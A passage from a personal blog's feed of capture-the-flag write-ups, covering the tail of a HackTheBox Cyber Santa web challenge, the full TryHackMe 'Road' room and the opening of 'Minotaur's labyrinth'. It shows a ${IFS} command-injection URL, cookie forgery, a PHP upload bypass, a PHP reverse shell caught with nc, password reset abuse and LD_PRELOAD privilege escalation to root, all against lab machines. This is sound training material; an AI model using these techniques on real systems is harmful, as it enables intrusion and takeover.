        return shell_exec('/santa_mon.sh '.$this-&amp;gt;command);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In a Python script shows the placeholder for the flag. The script is a web server running locally on port 3000.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;def http_server(host_port,content_type=&quot;application/json&quot;):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -&amp;gt; None:
			def resp_ok():
				self.send_response(200)
				self.send_header(&quot;Content-type&quot;, content_type)
				self.end_headers()
			if self.path == '/':
				resp_ok()
				if check_service():
					self.wfile.write(get_json({'status': 'running'}))
				else:
					self.wfile.write(get_json({'status': 'not running'}))
				return
			elif self.path == '/restart':
				restart_service()
				resp_ok()
				self.wfile.write(get_json({'status': 'service restarted successfully'}))
				return
			elif self.path == '/get_flag':
				resp_ok()
				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I should be able to curl localhost:3000/get_flag to grab the flag. However I need to bypass the sanitization. To do this I can use &lt;code class=&quot;highlighter-rouge&quot;&gt;${IFS}&lt;/code&gt;. &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces&quot;&gt;HackTricks&lt;/a&gt; is a great resource for techniques like this.&lt;/p&gt;

&lt;p&gt;So with the URL “http://:/?command=;curl${IFS}localhost:3000/get_flag” I get the flag!&lt;/p&gt;

&lt;h3 id=&quot;elf-directory&quot;&gt;Elf Directory&lt;/h3&gt;

&lt;p&gt;The description for Elf Directory was:&lt;/p&gt;

&lt;p&gt;“Can you infiltrate the Elf Directory to get a foothold inside Santa’s data warehouse in the North Pole?”&lt;/p&gt;

&lt;p&gt;There is no downloadable content for this challenge just a docker instance to start.&lt;/p&gt;

&lt;p&gt;Going to the docker instance IP and port shows a login page, unfortunately no simple SQL bypass this time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/elfdirectory.png&quot; alt=&quot;elfdirectory&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried some basic default credentials but had no luck so created an account with the username d4zs3c and logged in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a message:&lt;/p&gt;

&lt;p&gt;“You don’t have permission to edit your profile, contact the admin elf to approve your account!”&lt;/p&gt;

&lt;p&gt;Now logged I checked the developer tools in Firefox and I have a PHPSESSID. I coped the cookie value and put it in &lt;a href=&quot;https://gchq.github.io&quot;&gt;CyberChef&lt;/a&gt; and used ‘From Base64’ operation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cookie.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I removed the %3D which left with me &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:false}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Next I changed the input to &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:true}&lt;/code&gt; and used the ‘To Base64’. Using the developer tools I removed the value up until the %3d and pasted in my new base64 string which looked like: “eyJ1c2VybmFtZSI6ImQ0enMzYyIsImFwcHJvdmVkIjp0cnVlfQ==%3D”&lt;/p&gt;

&lt;p&gt;Now refreshing the page with my new cookie I get the option to upload a file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/approved.png&quot; alt=&quot;approved&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to upload a PHP file but got an error:&lt;/p&gt;

&lt;p&gt;“Invalid image. Only PNG images are supported.”&lt;/p&gt;

&lt;p&gt;So I downloaded an image of Santa (had to be) and tried to upload it but this time via Burp so I could modify it before its submitted. I appended the file name with .php and removed the contents of the file with a simple PHP script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/uploadbypass.gif&quot; alt=&quot;uploadbypass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now all I need to do is browse to the file and I will have command execution and can read the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commandinjection.gif&quot; alt=&quot;commandinjection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="hackthebox" />
      
        <category term="ctf" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Road Write Up</title>
      <link href="https://darrynbrownfield.co.uk/road" rel="alternate" type="text/html" title="Road Write Up" />
      <published>2021-11-29T00:00:00+00:00</published>
      <updated>2021-11-29T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/road</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/road">&lt;p&gt;&lt;img src=&quot;/assets/images/road/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/road&quot;&gt;Road&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/StillNoob&quot;&gt;StillNoob&lt;/a&gt;. Although rated as medium I would put it down as easy as the *cough* road is nicely laid out for you.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.149.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 09:52 GMT
Nmap scan report for 10.10.149.149
Host is up (0.055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - Openssh 8.2p1&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache httpd 2.4.41&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I did a second nmap scan on all ports but no other ports were open.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Taking a look at the web server shows a simple courier web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tested the track order search but it didn’t do anything so I moved on and clicked merchant central which took me to a login form.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried a few common credentials combinations but had no joy so registered my own account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/createuser.png&quot; alt=&quot;createuser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once in I got access to a static dashboard, none of the links on the left worked other than ‘ResetUser’. However I could view my profile.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/dashboard.png&quot; alt=&quot;dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only option available was to upload an image, however this needs be done my the admin. But now I have the admins email I might be able to use the reset user function to reset the admin’s password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/profile.png&quot; alt=&quot;profile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the ResetUser page the username is grey out but I put in a new password and opened Burp. With Intercept on I submitted the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/resetuser.png&quot; alt=&quot;resetuser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Burp I can see my account name but no protection mechanisms.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/pwreset.png&quot; alt=&quot;pwreset&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I changed the username to the admin account and forward the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/adminpwreset.png&quot; alt=&quot;adminpwreset&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I now have access to the admin account!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/admindashboard.png&quot; alt=&quot;admindashboard&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;Now I have access to the admin account, I should be able to upload a file. The site is using PHP so I tried uploading a php reverse shell. I copied a PHP reverse shell to my directory and edited the IP and port.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrotos]─[~/Documents/TryHackMe/Road]
└──╼ $mv php-reverse-shell.php shell.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then uploaded the file and started a listener using the command ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/upload.gif&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The profile picture (top right) hasn’t changed or error’d, so I inspect the element to show the src reference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/profilesource.png&quot; alt=&quot;profilesource&quot; /&gt;&lt;/p&gt;

&lt;p&gt;My upload is not in the assets folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/assets.png&quot; alt=&quot;assets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, looking at the source code for the profile page ‘http://10.10.149.149/v2/profile.php’ is a comment with a path for profile images.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/sourcecode.png&quot; alt=&quot;sourcecode&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;blockquote&gt;
      &lt;p&gt;The first time I scanned the source code I missed the comment, using curl is a quick and crude way of pulling all the comments off a web page which can be useful with a large web page.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -s http://10.10.149.149/v2/profile.php | grep '&amp;lt;!--'
    &amp;lt;!--&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;../assets/css/bootstrap.min.css&quot; crossorigin=&quot;anonymous&quot;&amp;gt;--&amp;gt;
  &amp;lt;!-- &amp;lt;script src=&quot;/assets/js/dataTable.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;
                    &amp;lt;!-- &amp;lt;div class=&quot;alert alert-danger&quot;&amp;gt;Take action&amp;lt;/div&amp;gt; --&amp;gt;
          &amp;lt;!-- &amp;lt;/ul&amp;gt; --&amp;gt;
&amp;lt;!-- /v2/profileimages/ --&amp;gt;
&amp;lt;!-- Include Required Prerequisites --&amp;gt;
&amp;lt;!-- Include Date Range Picker --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Going to the path, I can list the images however I know I named my file shell.php so I navigate to ‘http://10.10.149.149/v2/profileimages/shell.php’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/profileimages.png&quot; alt=&quot;profileimages&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I have a shell!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.149.149] 59984
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:20:14 up 32 min,  0 users,  load average: 0.00, 0.02, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc-1&quot;&gt;Priv Esc 1&lt;/h3&gt;

&lt;p&gt;I got a shell as www-data, I can use this to grab the user.txt flag but I need to now find a way to become the webdeveloper user.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ whoami
www-data
$ cd /home/
$ ls
webdeveloper
$ cd webdeveloper
$ ls -lah
total 36K
drwxr-xr-x 4 webdeveloper webdeveloper 4.0K Oct  8 10:59 .
drwxr-xr-x 3 root         root         4.0K May 25  2021 ..
lrwxrwxrwx 1 webdeveloper webdeveloper    9 May 25  2021 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 webdeveloper webdeveloper  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webdeveloper webdeveloper 3.7K Feb 25  2020 .bashrc
drwx------ 2 webdeveloper webdeveloper 4.0K May 25  2021 .cache
drwxrwxr-x 3 webdeveloper webdeveloper 4.0K May 25  2021 .local
-rw------- 1 webdeveloper webdeveloper   51 Oct  8 10:59 .mysql_history
-rw-r--r-- 1 webdeveloper webdeveloper  807 Feb 25  2020 .profile
-rw-r--r-- 1 webdeveloper webdeveloper    0 Oct  7 17:53 .sudo_as_admin_successful
-rw-r--r-- 1 webdeveloper webdeveloper   33 May 25  2021 user.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I enumerate the box and take a look at the listening ports and find MongoDB is listening on 27017.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ ss -tulp
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process
udp   UNCONN 0      0           127.0.0.53%lo:domain       0.0.0.0:*           
udp   UNCONN 0      0      10.10.149.149%eth0:bootpc       0.0.0.0:*           
tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*           
tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*           
tcp   LISTEN 0      151             127.0.0.1:mysql        0.0.0.0:*           
tcp   LISTEN 0      4096        127.0.0.53%lo:domain       0.0.0.0:*           
tcp   LISTEN 0      128               0.0.0.0:ssh          0.0.0.0:*           
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*           
tcp   LISTEN 0      511                     *:http               *:*           
tcp   LISTEN 0      128                  [::]:ssh             [::]:*           
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Connecting to mongo I found the webdeveloper credentials, Ive redacted them in the output below.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;amp;gssapiServiceName=mongodb
Implicit session: session { &quot;id&quot; : UUID(&quot;0ad03a25-0c2d-4c46-8adf-bb97086a2f15&quot;) }
MongoDB server version: 4.4.6
show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
use backup
switched to db backup
show collections
collection
user
db.user.find()
{ &quot;_id&quot; : ObjectId(&quot;60ae2661203d21857b184a76&quot;), &quot;Month&quot; : &quot;Feb&quot;, &quot;Profit&quot; : &quot;25000&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae2677203d21857b184a77&quot;), &quot;Month&quot; : &quot;March&quot;, &quot;Profit&quot; : &quot;5000&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae2690203d21857b184a78&quot;), &quot;Name&quot; : &quot;webdeveloper&quot;, &quot;Pass&quot; : &quot;&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae26bf203d21857b184a79&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;EndDate&quot; : &quot;December&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae26d2203d21857b184a7a&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;Salary&quot; : &quot;30000&quot; }
exit
bye
Error saving history file: FileOpenFailed Unable to open() file /var/www/.dbshell: Permission denied
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I can now SSH in to the machine as webdeveloper.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh webdeveloper@10.10.149.149
The authenticity of host '10.10.149.149 (10.10.149.149)' can't be established.
ECDSA key fingerprint is SHA256:zSoCEcBBY73hNL9ItPA4CnB/405/W6GQYsl94qRMkOo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.149.149' (ECDSA) to the list of known hosts.
webdeveloper@10.10.149.149's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 29 Nov 2021 10:26:45 AM UTC

  System load:  0.0               Processes:             121
  Usage of /:   60.0% of 9.78GB   Users logged in:       0
  Memory usage: 63%               IPv4 address for eth0: 10.10.149.149
  Swap usage:   0%


185 updates can be installed immediately.
100 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
webdeveloper@sky:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc-2&quot;&gt;Priv Esc 2&lt;/h3&gt;

&lt;p&gt;Once connected as webdeveloper I did ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;’, there is a binary the user can run that could be vulnerable however LD_PRELOAD is configured which could also provide a path to priv esc.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
webdeveloper@sky:~$                                                                    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&quot;&gt;article&lt;/a&gt; at Hacking Articles provides a great step by step on how to exploit this. I created the shell.c file as per the article and run the sudo command to become root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Minotaur’s labyrinth Write Up</title>
      <link href="https://darrynbrownfield.co.uk/minotaurslabyrinth" rel="alternate" type="text/html" title="Minotaur's labyrinth Write Up" />
      <published>2021-11-07T00:00:00+00:00</published>
      <updated>2021-11-07T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/minotaurslabyrinth</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/minotaurslabyrinth">&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/labyrinth8llv&quot;&gt;Minotaur’s labyrinth&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/xenox&quot;&gt;xenox&lt;/a&gt; and &lt;a href=&quot;https://tryhackme.com/p/spayc&quot;&gt;spayc&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Minotaur threw a fit and captured some people in the Labyrinth. Are you able to help Daedalus free them?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# Nmap 7.91 scan initiated Sun Nov  7 12:41:10 2021 as: nmap -sC -sV -oA nmap/initial 10.10.68.118
Nmap scan report for 10.10.68.118
Host is up (0.044s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, Help, Kerberos, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Host 'ip-10-8-21-217.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=11/7%Time=6187C968%P=x86_64-pc-linux-gnu%r(NU
SF:LL,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.i
SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
SF:aDB\x20server&quot;)%r(GenericLines,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-2
SF:1-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,68,&quot;d\0\0\x01\
SF:xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x2
SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r
SF:(RTSPRequest,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
SF:is\x20MariaDB\x20server&quot;)%r(DNSVersionBindReqTCP,68,&quot;d\0\0\x01\xffj\x04
SF:Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSStat
SF:usRequestTCP,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
SF:is\x20MariaDB\x20server&quot;)%r(Help,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8
SF:-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(SSLSessionReq,68,&quot;d\0\0
SF:\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r&quot;)%r(TerminalServerCookie,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-21
SF:7\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conne
SF:ct\x20to\x20this\x20MariaDB\x20server&quot;)%r(TLSSessionReq,68,&quot;d\0\0\x01\x
SF:ffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(
SF:Kerberos,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.comp
SF:ute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
SF:20MariaDB\x20server&quot;)%r(SMBProgNeg,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10
SF:-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  7 12:41:26 2021 -- 1 IP address (1 host up) scanned in 16.38 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4 ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;21 - FTP - ProFTPD&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache httpd 2.4.48&lt;/li&gt;
  &lt;li&gt;443 - HTTPS - Apache httpd 2.4.48&lt;/li&gt;
  &lt;li&gt;3306 - MYSQL - MariaDB server&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;FTP allows anonymous access so I started by looking for anything interesting in there.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.68.118                                                   
Connected to 10.10.68.118.                                               
220 ProFTPD Server (ProFTPD) [::ffff:10.10.68.118]                       
Name (10.10.68.118:daz): anonymous                                       
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
226 Transfer complete
ftp&amp;gt; cd pub
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
